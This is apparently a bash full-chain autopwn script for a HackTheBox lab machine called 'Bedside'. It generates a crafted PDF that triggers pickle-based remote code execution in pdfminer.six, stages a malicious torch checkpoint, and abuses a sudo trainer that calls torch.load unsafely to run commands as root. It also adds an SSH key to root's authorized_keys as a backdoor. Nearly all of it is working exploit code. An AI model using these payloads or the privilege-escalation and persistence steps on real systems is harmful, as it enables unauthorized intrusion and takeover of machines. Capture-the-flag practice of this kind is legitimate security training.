#!/usr/bin/env bash
#
# pwn_bedside.sh — HackTheBox "Bedside" (Linux/Medium) full-chain autopwn
#
#   Usage:  ./pwn_bedside.sh <TARGET_IP> [path/to/developer_rsa]
#
# Chain:
#   1. pdfminer.six pickle CMap RCE (CVE-2025-64512)  -> datawrangler (container)
#      stages a malicious torch checkpoint + a valid image on the shared /datastore
#   2. developer SSH key (already recovered) -> user.txt
#   3. sudo NOPASSWD MONAI trainer -> torch.load(weights_only=False) -> root
#
set -uo pipefail

# ---------------------------------------------------------------- args ----
TARGET="${1:-}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KEY="${2:-$SCRIPT_DIR/developer_rsa}"
VHOST="research.bedside.htb"
UPLOADS="/var/www/research.bedside.htb/uploads"

if [[ -z "$TARGET" ]]; then
    echo "Usage: $0 <TARGET_IP> [developer_rsa]" >&2
    exit 1
fi
if [[ ! -f "$KEY" ]]; then
    echo "[-] SSH key not found: $KEY" >&2
    exit 1
fi
chmod 600 "$KEY" 2>/dev/null

c() { printf '\033[1;32m%s\033[0m\n' "$*"; }   # green
w() { printf '\033[1;33m%s\033[0m\n' "$*"; }   # yellow
e() { printf '\033[1;31m%s\033[0m\n' "$*"; }   # red

CURL=(curl -s -m 30 --resolve "${VHOST}:80:${TARGET}")
SSH=(ssh -i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
     -o ConnectTimeout=15 -o LogLevel=ERROR "developer@${TARGET}")
SSH_ROOT=(ssh -i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
     -o ConnectTimeout=15 -o LogLevel=ERROR "root@${TARGET}")

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

# ---------------------------------------------------- build payloads ------
c "[*] Building exploit artifacts..."
python3 - "$WORK" "$UPLOADS" <<'PY'
import os, sys, pickle, gzip, base64, struct, zlib
work, uploads = sys.argv[1], sys.argv[2]

def make_png(w=64, h=64):
    def ch(t, d):
        cc = t + d
        return struct.pack(">I", len(d)) + cc + struct.pack(">I", zlib.crc32(cc) & 0xffffffff)
    raw = b"".join(b"\x00" + bytes([(x*4) % 256 for x in range(w)]) for _ in range(h))
    return (b"\x89PNG\r\n\x1a\n"
            + ch(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 0, 0, 0, 0))
            + ch(b"IDAT", zlib.compress(raw, 9))
            + ch(b"IEND", b""))
png_b64 = base64.b64encode(make_png()).decode()

ROOT_CMD = ("cp /root/root.txt /tmp/.rf 2>/dev/null; chmod 644 /tmp/.rf 2>/dev/null; "
            "mkdir -p /root/.ssh; "
            "cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys 2>/dev/null; "
            "chmod 600 /root/.ssh/authorized_keys 2>/dev/null")
class Root:
    def __reduce__(self): return (os.system, (ROOT_CMD,))
pt_b64 = base64.b64encode(pickle.dumps(Root(), protocol=2)).decode()

STAGE = ("mkdir -p /datastore/checkpoints /datastore/processed; "
         "rm -f /datastore/checkpoints/*.pt; "
         f"echo {pt_b64} | base64 -d > /datastore/checkpoints/checkpoint_epoch_999.pt; "
         f"echo {png_b64} | base64 -d > /datastore/processed/scan.png; "
         "chmod 666 /datastore/checkpoints/*.pt /datastore/processed/scan.png 2>/dev/null")
class Foot:
    def __reduce__(self): return (os.system, (STAGE,))
with gzip.open(os.path.join(work, "evil.pickle.gz"), "wb") as f:
    f.write(pickle.dumps(Foot(), protocol=2))

enc = (uploads + "/evil").replace("/", "#2F")
objs = [
    b"<< /Type /Catalog /Pages 2 0 R >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
    b"/Resources << /Font << /F1 4 0 R >> >> /Contents 6 0 R >>",
    ("<< /Type /Font /Subtype /Type0 /BaseFont /Arial /Encoding /"
     + enc + " /DescendantFonts [5 0 R] >>").encode(),
    b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Arial "
    b"/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> >>",
]
stream = b"BT /F1 12 Tf 100 700 Td <0041> Tj ET"
objs.append(b"<< /Length %d >>\nstream\n%s\nendstream" % (len(stream), stream))

pdf = b"%PDF-1.5\n"; offs = []
for i, body in enumerate(objs, 1):
    offs.append(len(pdf)); pdf += b"%d 0 obj\n" % i + body + b"\nendobj\n"
xref = len(pdf)
pdf += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs)+1)
for o in offs: pdf += b"%010d 00000 n \n" % o
pdf += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF" % (len(objs)+1, xref)
open(os.path.join(work, "trigger.pdf"), "wb").write(pdf)
print("    payloads ready")
PY
[[ -f "$WORK/evil.pickle.gz" && -f "$WORK/trigger.pdf" ]] || { e "[-] payload build failed"; exit 1; }

# --------------------------------------------------- upload foothold ------
c "[*] Uploading foothold pickle -> $VHOST ..."
"${CURL[@]}" -X POST "http://${VHOST}/" \
    -F "uploadFile=@$WORK/evil.pickle.gz;filename=evil.pickle.gz" >/dev/null
code="$("${CURL[@]}" -o /dev/null -w '%{http_code}' "http://${VHOST}/uploads/evil.pickle.gz")"
[[ "$code" == "200" ]] || { e "[-] pickle not served (HTTP $code)"; exit 1; }
c "    pickle live at /uploads/evil.pickle.gz"

c "[*] Uploading trigger PDF (Type0 /Encoding = abs path to pickle)..."
"${CURL[@]}" -X POST "http://${VHOST}/" \
    -F "uploadFile=@$WORK/trigger.pdf;filename=trigger.pdf;type=application/pdf" >/dev/null
c "    trigger uploaded; pdf_watcher polls ~every 30s"

# ------------------------------------------------------- user flag --------
c "[*] SSH as developer -> user.txt ..."
USER_FLAG="$("${SSH[@]}" 'cat ~/user.txt 2>/dev/null' 2>/dev/null | tr -d '\r' | grep -oE '^[0-9a-f]{32}$' | head -1)"
[[ -n "$USER_FLAG" ]] && c "    USER FLAG: $USER_FLAG" || w "    user.txt not read (key/target ok?)"

# ------------------------------ wait for staging + trigger root -----------
c "[*] Waiting for datawrangler foothold, then triggering sudo trainer..."
ROOT_FLAG=""
for i in $(seq 1 8); do
    w "    attempt $i/8 (giving the worker time to stage the checkpoint)..."
    sleep 30
    OUT="$("${SSH[@]}" '
        setsid sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py </dev/null >/tmp/tr.log 2>&1 &
        sleep 18
        printf "RF:%s\n" "$(cat /tmp/.rf 2>/dev/null | tr -d "\r\n")"
    ' 2>/dev/null)"
    ROOT_FLAG="$(printf '%s\n' "$OUT" | grep -oE 'RF:[0-9a-f]{32}' | head -1 | cut -d: -f2)"
    [[ -n "$ROOT_FLAG" ]] && break
done

# --------------------------------------------------------- results --------
echo
if [[ -n "$ROOT_FLAG" ]]; then
    c "==============================================="
    c " TARGET   : $TARGET"
    c " USER FLAG: ${USER_FLAG:-<not captured>}"
    c " ROOT FLAG: $ROOT_FLAG"
    c "==============================================="
    c "[*] Root SSH also enabled:  ssh -i $KEY root@$TARGET"
else
    e "[-] Root flag not captured. Check manually:"
    e "      ${SSH[*]} 'head -40 /tmp/tr.log; cat /tmp/.rf'"
    exit 1
fi
